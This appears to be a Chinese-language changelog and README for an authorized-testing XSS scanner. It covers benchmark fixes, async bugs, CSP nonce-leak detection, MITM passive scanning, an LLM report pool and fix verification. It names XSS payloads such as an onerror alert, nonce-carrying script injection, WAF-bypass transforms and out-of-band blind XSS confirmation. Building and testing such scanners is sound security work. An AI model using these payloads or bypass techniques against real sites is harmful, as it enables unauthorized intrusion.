**Phase 105：`--diff` 的静默失败（真实使用时才发现）**。拿两份 `benchmark/results/*.json` 跑 `--diff`，它输出"New 0 / Fixed 0 / Regressed 0"、CI verdict PASS——**实际上什么都没比**：`load_report` 是 `data.get("findings", [])`，而基准结果 JSON 用的是 `cases[]`，于是静默返回空列表。客户复测时这类"看起来一切都好"的假绿灯比报错危险得多。现在 `load_report` 校验结构：顶层非对象 / 无 `findings` / `findings` 非列表 / 疑似基准结果（`cases[]`）全部抛 `ValueError` 并指明原因（CLI 已有捕获，打印错误并退出码 2）；**空 `findings` 仍合法**（干净目标是正常结果，不能误伤）。测试 11 例（新增 3 例：基准 JSON 误用、异形 JSON、空 findings 合法）。

**Phase 104：复测差分（`--diff`）的测试覆盖补齐**。复测是漏洞闭环的一环：客户修完重扫，报告要说清哪些 NEW、哪些 FIXED、哪些严重度恶化。`diff_report.py` 的 259 行五分类逻辑（new/fixed/unchanged/regressed/improved + CI verdict）此前**零测试**——错了会直接进客户的复测报告。新增 `tests/test_diff_report.py` 8 例：URL 归一化忽略 fragment 与默认端口但非默认端口参与身份；finding key 对大小写/默认端口不敏感、对 param/context/type 敏感；severity 排序与未知值兜底 info；新增/修复/未变分类；恶化与改善按严重度判定且**恶化不得计入 unchanged**；**CI verdict 只在 new/regressed 时 FAIL（修好东西不能挂构建）**；HTML 渲染；load_report 读取。8/8 一次通过——实现本身正确，缺的只是覆盖。

**Phase 103：FN 重试时放宽 timeout（专治上面这类"慢而非断"的假 FN）**。同一份慢度下重试只是在重复测量慢本身，所以重试改走 `TIMEOUT × FN_RETRY_TIMEOUT_SCALE`（默认 2，`XSS_FN_RETRY_TIMEOUT_SCALE` 可配）；每次 attempt 记录其真实 timeout，`meta.fn_retry_timeout_scale` 与预算键同步扩展（跨 run 对比仍按口径校验）。核心命题已真实验证：同一慢服务器（每响应 0.35s）下 **tight=2s → FN（requests=0）/ widened=30s → TP（33 请求，15.6s）**，对照组（无延迟同一用例）TP 0.9s —— 说明瓶颈确是整体超时而非连接失败。注意 `timeout` 是**整体扫描超时**而非每请求超时（调参时踩过这一坑）。测试 `tests/test_bench_fn_retry.py` 5 例（含断言重试必须用 `TIMEOUT×scale`、而非复用原上限）。

**Phase 101b：修掉一个我自己引入的挂死（异步锁的 loop 归属）**。

**Phase 101b：修掉一个我自己引入的挂死（异步锁的 loop 归属）**。Phase 98b 为 `AsyncScanner.__init__` 加的"宿主无 loop 时补建 loop"兜底是错的：py3.9 的 `asyncio.Lock()` 绑定**构造时**的 loop，构造函数自己装的 loop 与调用方 `asyncio.run()` 的 loop 不是同一个——锁绑在死 loop 上，每个 `async with lock` 永久挂起，把原本清晰的 RuntimeError 变成了**测试集挂死**（回归中 `test_csp_nonce_async_parity.py` 卡在 `asyncio._poll`）。正确修法是**惰性创建**：`_lock` 在 `__init__` 置 None，`_get_lock()` 在真正运行的 loop 里首次使用才构造（6 处 `async with self._lock` 全部改走 `_get_lock()`）；既不报错也不劫持宿主的 loop。新增契约测试 `test_host_loop_is_not_hijacked_by_scanner_construction`（宿主先 `set_event_loop` 再 `asyncio.run`，挂死即 pytest-timeout 失败）。全量回归 **70/70 文件绿**（723s，较修复前 1875s 大幅缩短——挂死消除）。

**Phase 101：FN 二次确认加退避与多轮重试**。Phase 97 的 fn-retry 只重试 1 次且无等待——p97 跑动里 `neg-rcdata-02` 在劣化窗口内**连超时两次、单跑 13 请求即 TP**，说明窗口能盖过一次立即重试。现在：重试最多 `FN_RETRY_MAX`（默认 2）次，间隔 `FN_RETRY_WAIT`（默认 20s，可用 `XSS_FN_RETRY_MAX`/`XSS_FN_RETRY_WAIT` 环境变量调）让窗口过去；`fn_retry.attempts` 记录**每一次**尝试的 verdict/耗时/请求数/error（首跑仍在 `first`）；任一次非劣化则立即停止（已翻案就不再消耗时间），全劣化则如实保留 FN 并在 meta 与日志中标注策略。`meta.fn_retry_max/wait` 在**写入时**读取（而非 import 时快照），确保描述的是真正生效的策略。测试 `tests/test_bench_fn_retry.py` 4 例（二次翻案、耗尽保留 FN、正常完成 FN 零重试、meta 记录策略）+ 端到端演练（timeout=1 构造必现 FN：attempts=3、退避 2s 生效、耗时 5.2s）。

**Phase 99：HTTPS MITM 端到端演练（补齐被动扫描实战价值的验证空白）**。`test_passive_mitm.py` 只证明传输层（TLS 拦截、参数进捕获队列）——但工程师装 CA 浏览一次目标站就能拿到**已验证 finding + 可回放 PoC**才是被动扫描的卖点，这条全链路此前零覆盖。新增 `tests/test_passive_mitm_e2e.py`：本地 TLS origin（raw 回显）+ MitmManager CA + `PassiveProxy(mitm_ca=...)` + `drain_captures` 后台 worker + 真 Scanner（`verify_ssl=False` 对自签 origin）——客户端经代理访问 `https://…/vuln?q=login` 一次，断言 `stats.mitm/scans ≥ 1`、finding 的 URL 为 https 且 param=q、`attach_pocs` 后 curl PoC 携带确认载荷。**一次通过，无需修产品代码**——并行会话的 Phase 50 MITM 实现质量过关；proxy/scanner 对自签 origin 均需 `verify_ssl=False`（文档级注意点）。

**Phase 100：async 侧 CSP nonce 泄漏利用（双引擎对偶缺口，基准抓出的真 FN）**。107 用例基准跑出 async **唯一一个非 timeout 的 FN**：`pos-csp-01`（`csp_nonce_ui_leak`，2.78s 正常完成），而 sync 是 TP（78.89s）。定位：**Phase 36 的 nonce-leak 利用 `_try_csp_nonce` 只在 sync 实现**，async 全文 `nonce` 仅出现在一行注释——`--async` 会静默漏掉所有 nonce 泄漏端点。修复：`_probe_param` 末尾（载荷循环与位置转移之后）加对偶实现，复用共享的 `csp.extract_nonces_from_csp` / `detect_nonce_near_marker`，发带**真实 nonce** 的 `<script nonce='N'>` 载荷，verifier 的 nonce 白名单仍防误报。**两个 async 专属坑**：① `text` 被载荷循环反复覆盖——必须用 marker 探测响应的快照（`probe_text`/`probe_headers`），否则检查的是最后一个载荷的响应，marker 与 nonce 都已不在；② 快照只能在探测处保存。测试 `tests/test_csp_nonce_async_parity.py` 2 例（检出 + 快照回归：nonce 只出现在探测响应时仍须检出）。效果：`pos-csp-01` FN→**TP（2.7s）**，async 有效口径 **TP72 FP0 TN35 FN0**（f1=1.000；本轮 neg-rcdata-02 两次劣化 timeout，单跑 13 请求即 TP）；全量回归 69/69 文件绿（1654s）。


API 攻击面加固：--serve 状态变更路由同源防御（Phase 70）+ Host 全方法校验（Phase 71）+ MITM CA 私钥 0600 与并发签名锁（Phase 72）。曾有两处结构性问题已修：`test_benchmark.py` 的 function-scope fixture 让每个测试重跑 6 端点 benchmark（需 1-2h）→ 改 module scope 共享一次运行后 **19 秒全过**（33 例）；`test_p27_api.py` 端到端偶发连接超时是劣化窗口掐 loopback（非代码问题，单跑必过）。

**基准工具链**：`benchmark/run_benchmark_batched.py [out.json] [batch] [port] [sync|async] [max_payloads] [max_transforms] [timeout]` —— 位置参数 4-7 可选，默认 sync/10/6/45；传 `sync 14 12 90` 才能复现 `python -m benchmark.runner` 的标定口径（旧基线就是 14/12/90，用默认 10/6 跑出来的数不能直接跟它比）。续跑时若检测到预算变了会丢弃旧结果而非静默合并。`benchmark/compare_runs.py A.json B.json` 做逐用例 diff（聚合分会掩盖"哪些用例移动了"，ERROR→FP 单独分桶，不会被当成改进）；`benchmark/repro_case.py CASE_ID [port] [sync|async]` 单跑一个用例并打印服务端原始回显 + 判定 + finding 详情——**排误报和验证 FN 是否是环境问题都用它**。

**Phase 176：LLM 多供应商故障转移池 + AI 报告章节（`--ai-report`）**。报告此前只有确定性模板与语料修复建议；现在可选配一段由大模型撰写的叙事章节（执行摘要 / 风险评级 / 逐条成因与修复 / 修复优先级）。**判定权不下放**：类型、严重度、URL、参数、载荷全部来自确定性引擎，模型只写散文——prompt 明令禁止编造，`report_ai._verify_facts` 事后核对模型引用的 URL 与载荷是否真在输入里，对不上的进报告页脚告警而非当作事实。**默认关闭**：开启后目标 URL/参数/载荷会发给第三方供应商，帮助文本里已写明。**必须降级**：池全挂时回落 `data/fix_advice.json` 语料模板并在文首标注原因，报告永远有产出。

池本体 `core/llm_pool.py`（零新依赖，仅 `requests`）：候选按「provider × key × model」展开（**model-outer / key-inner**，多 key 视为同一模型列表的配额冗余，先把首选模型在所有 key 上试一遍）；失败分类读 **body** 而不只看状态码——实测供应商会返回两种含义相反的 403（账户被封 vs 某个模型不在 token plan），只看码会把一个健康 key 整个停掉。冷却分作用域：`rate_limit` / `model_error` / `empty_response` / `truncated_response` 记在**候选级**（AMD 的并发上限是 **per-model**：「Model 'GLM-5.3-Flash' is at its concurrency limit (8)」，同 key 其他模型完全可用），`auth_error` / `server_error` / `timeout` 记在 **key 级**；同一轮内 key 级失败后同 key 的兄弟候选直接跳过（实测这处浪费让一次报告从 45s 涨到 95s+）。冷却带指数退避并持久化到 `data/llm_state.json`（跨进程保留限流窗口），全池冷却时取最快恢复者强行试一次，退化而非死掉。

**实测（2026-09-22，全部真实调用）**：4 家供应商里 3 家的模型名有误或已下线（`stealth/ox-alpha` 404 测试期已结束、`z-ai/glm-5.2` 410 于 2026-08-21 EOL、`glm 5.3 flash` 真名 `GLM-5.3-Flash`），1 家整个账户被封（OpenRouter 403 "Inference is blocked on this account"）→ 配置里 `enabled: false` 并留证据。**ping 延迟不能用来排序**：AMD `DeepSeek-V4-Flash` 用 16-token ping 测是 0.9s，生成真实报告 **153s 超时**；最终首选 `sensenova/deepseek-v4-flash`（9.3s 出 1712 字符完整报告）。另有两种 200 假成功被识别并拦住：flash 类模型随机返回**空 body**（7 次探测 3 次），推理模型把预算烧在思考通道上导致**正文仅 95 字符** → 新增 `truncated_response` 与调用方传入的 `report_ai.MIN_REPORT_CHARS` 门槛。端到端：v1 排序 3 次转移 / 95.4s，最终排序 1 次转移 / 44.5s，全程无人工干预。报告 HTML 渲染 **escape-first**（正文按构造即含活载荷，报告不能自己变成载体），模型输出的思考通道由 `clean_completion` 两段式清洗。CLI：`--ai-report --ai-config --ai-lang --ai-model --ai-max-findings --ai-timeout`，另有 `--ai-check`（逐候选真实探测打健康表，key 全程脱敏）与 `--ai-reset`。测试 `tests/test_llm_pool.py` + `tests/test_ai_report.py` 共 104 例，全部用本地 mock（真 HTTP，不改 transport）；**mock server 必须用 `HTTP/1.0`**——禁用 keep-alive 才不会在本机劣化 loopback 下出现池化连接撞死 socket（`WinError 10054`）的假失败。

**REST API（`--serve`）同样可选该章节**：`POST /api/v1/scans` 带 `{"ai_report": true}` 时，扫描**自己的 worker 线程**在收尾阶段撰写章节，因此**没有任何 HTTP 请求会等模型**，客户端第一次取报告就已带章节；`GET .../report?ai=1` 用于给没提前要求的扫描补生成（会阻塞该次请求），`?ai=refresh` 强制重建。每扫描可调 `ai_lang`（zh|en）/ `ai_model`（模型白名单）/ `ai_timeout` / `ai_max_findings`。结果缓存在 job 上（**内存态**，重启即失效——它是派生产物，重算即可，为此不动 sqlite schema），并用锁保证并发请求最多只产生一次模型调用。池路径只由服务端 `--ai-config` 决定（缺省用包内池），请求体只能挑模型、不能指定路径。三个测试文件合计 **128 例**。

**本轮踩到的真问题（测试隔离）**：`ai_config` 为空时池发现顺序会**回落到包内的真池（真 key）**，于是"未配池"的 API 测试会真的调用外部供应商——曾让 4 个用例各花 34s 出网，整组 438s。两层修法：`tests/conftest.py` 默认把 `XSSENTINEL_LLM_CONFIG` 指向一个不存在的路径（任何忘记显式传池的测试都降级而非出网；`XSSENTINEL_ALLOW_LIVE_LLM_IN_TESTS=1` 可放开跑真集成），而**显式传入的 `config_path` 优先于环境变量**，所以真正测池的用例不受影响。修复后同一组 438s → 49s。

**复测报告（`--verify-fix`）也能带该章节**（Phase 176c）：复测结果是给客户的交付物，让模型把"哪些已修复、哪些仍可利用、哪些因类型限制无法自动复测"写成叙事并给出后续步骤，价值明确。它走**另一套 brief**（`report_ai` 的 `task="verify"`）：prompt 明令**禁止改动任何一条的复测状态**，且 `skipped`/`error` 必须叙述为「未知」而不得混入「已修复」——这正是复测报告唯一会骗到客户的地方。digest 不截断（交付物要交代每一条）并按 `still_vuln` 优先排序；降级模板同样保持固定结构、空章节写「无」。HTML/JSON 两种复测报告都支持（JSON 里 `ai_report` 不含 html 字段）。`--diff` **未接入**——那是对比工具而非报告，加叙事意义不大。

**顺带修掉一个既有假阴性（同轮实测发现）**：复测把注入的载荷**追加**到 finding 的 URL query 之后（`?q=test&q=<marked>`），服务器读第一个 → payload 从未到达目标参数 → 判定为 `fixed`。而 finding 的 URL 自带被测参数正是扫描器输出的常态，所以复测在**最常见场景下静默失效**，把**未修复的漏洞报成已修复**——这是复测报告最危险的失败模式（客户被告知已修复，实际洞还开着）。修法：先把 URL 自身的 query 搬进 `params` 再注入，使注入成为**覆盖**，同时保留其他兄弟参数。同一靶场实测：修复前 `Fixed 2 / Still vulnerable 0`（全假阴性，CI gate 形同虚设），修复后 `Still vulnerable 1 / Fixed 1`（真实结论，exit=1 正确拦截）。加 3 例回归锁定（覆盖不重复、兄弟参数保留、POST 路径不受影响）。四个 AI 测试文件合计 **168 例**，`tests/test_verify_fix.py` 从 5 例增至 8 例。

---

## 扩展指南

- **加 payload**：编辑 `data/payloads.json`，每条含 `context / payload / tags / confidence / note`，引擎自动按上下文选用。
- **加修复建议**：编辑 `data/fix_advice.json`（123+ 条，按 finding type 索引；`fix_advice.py` 是惰性加载器，API 不变）。
- **加检测场景**：编辑自己的场景 JSON（参考 `data/scenarios.example.json`）并 `--scenarios` 传入：按参数名匹配触发多步 HTTP 流（写入→读取→语义确认），`{token}`/`{param}` 占位符自动替换，适配存储型/二级流（Nuclei 风格）。
- **加绕过变形**：在 `core/transform.py` 的 `REGISTRY` 注册新函数即可被审计引擎调用。
- **加 WAF 指纹**：在 `core/waf.py` 的 `_WAF_SIGNATURES` 增加 `(名称, 正则)`。
- **加 sink/source**：扩展 `core/dom.py` 的源/汇列表。
- **加 LLM 供应商**：编辑 `data/llm_providers.json` 的 `providers` 数组（`base_url` + `keys` + `models`，`enabled` 控制开关；`base_url` 带不带 `/chat/completions` 都会归一化）。凭据可用 `XSSENTINEL_LLM_KEY_<PROVIDER_ID>`（逗号分隔）覆盖，池路径用 `XSSENTINEL_LLM_CONFIG` 覆盖。改完**务必用 `--ai-check` 实测一遍**——供应商给的模型名与可用性别照抄（Phase 176 里 4 家有 3 家的名字是错的，1 家账户已被封）。

---

## 已知限制

- 纯静态/语义确认对复杂上下文（嵌套模板、前端框架编译输出）可能漏报或需无头确认补强。
- 无头确认与 DOM 动态执行确认（L6）依赖 Playwright；未安装时自动跳过/优雅降级（DOM 层退化为静态启发式，反射层仍给出语义确认结论）。
- 爬虫为 BFS 轻量级实现（默认深度 2），复杂 SPA / 鉴权流建议配合 `--headless` 或人工提供入口；`--scope` 可把爬取限制在指定路径前缀内。
- 去重按 `(type, URL, param, context)` 合并同源同参的重复命中；DOM 类忽略 query 差异，避免同一页面的 hash/cookie 型 DOM XSS 被报两次。
- 可复现 PoC 对 DOM 类漏洞会用真实执行型 payload（`<img src=x onerror=alert(document.domain)>`）替换内部标记，确保 PoC 页面点开即触发。
- **盲打 XSS（L5）已支持自动确认**：`--oob self` 起本地监听器、`--oob interactsh` 用公共服务器，收到 beacon 即判定为已确认盲打；若超时未收到回调则不报（避免误判）。`interactsh` 模式需要公网可达的 callback 域名与网络连通，离线时优雅降级为"注入但未确认"。
- **存储型 XSS（L4）需要"展示页"**：你必须提供注入接口与其对应的展示/列表接口（如评论提交页 + 评论列表页），框架才会重新拉取确认持久化执行。
- **AI 报告（`--ai-report`）默认关闭**：一旦开启，目标 URL、参数与载荷会发送给 `data/llm_providers.json` 里配置的第三方 LLM 供应商。检测结论不受影响（模型只写叙事章节），但数据出网这件事由操作者决定。REST API（`--serve`）走同一套开关：扫描时 `{"ai_report": true}`，或取报告时 `?ai=1`。
- 这是安全研究/授权测试工具，请勿用于未授权目标。
